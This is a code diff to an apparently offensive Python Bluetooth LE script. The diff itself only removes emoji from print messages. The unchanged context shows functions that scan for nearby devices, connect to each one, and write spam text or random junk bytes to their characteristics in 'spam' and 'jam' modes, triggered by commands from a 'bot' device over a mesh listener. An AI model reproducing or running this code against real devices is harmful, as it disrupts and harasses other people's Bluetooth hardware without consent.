@@ -25,7 +25,7 @@ class MeshCommandDelegate(DefaultDelegate):
             perform_scan_and_attack(mode="spam")
 
 def perform_scan():
-    print("🔍 Scanning for new devices...")
+    print(" Scanning for new devices...")
     scanner = Scanner()
     try:
         devices = scanner.scan(10.0)
@@ -33,9 +33,9 @@ def perform_scan():
             mac = dev.addr
             name = dev.getValueText(9) or "Unnamed"
             rssi = dev.rssi
-            print(f"✨ Found: {mac} ({name}, RSSI={rssi})")
+            print(f" Found: {mac} ({name}, RSSI={rssi})")
     except Exception as e:
-        print(f"⚠️ Scan failed: {e}")
+        print(f" Scan failed: {e}")
 
 def perform_scan_and_attack(mode="spam"):
     scanner = Scanner()
@@ -48,27 +48,27 @@ def perform_scan_and_attack(mode="spam"):
                 if mode == "spam":
                     msg = b"SpamJam Love"
                     p.writeCharacteristic(0x0001, msg)
-                    print(f"💌 Spammed {target}")
+                    print(f" Spammed {target}")
                 elif mode == "jam":
                     junk = os.urandom(random.randint(20, 40))
                     p.writeCharacteristic(0x000b, junk, withResponse=False)
-                    print(f"🚫 Jammed {target}")
+                    print(f" Jammed {target}")
                 p.disconnect()
             except Exception as e:
-                print(f"⚠️ Could not {mode} {target}: {e}")
+                print(f"Could not {mode} {target}: {e}")
     except Exception as e:
-        print(f"⚠️ Scan + {mode} failed: {e}")
+        print(f" Scan + {mode} failed: {e}")
 
 def listen_to_bot(mac):
     try:
-        print(f"📡 Listening for mesh commands from {mac}...")
+        print(f"Listening for mesh commands from {mac}...")
         p = Peripheral(mac, ADDR_TYPE_RANDOM)
         p.setDelegate(MeshCommandDelegate())
         while True:
             if p.waitForNotifications(10.0):
                 continue
     except Exception as e:
-        print(f"⚠️ Failed to connect to {mac}: {e}")
+        print(f" Failed to connect to {mac}: {e}")
 
 if __name__ == "__main__":
     listen_to_bot(TARGET_MAC)
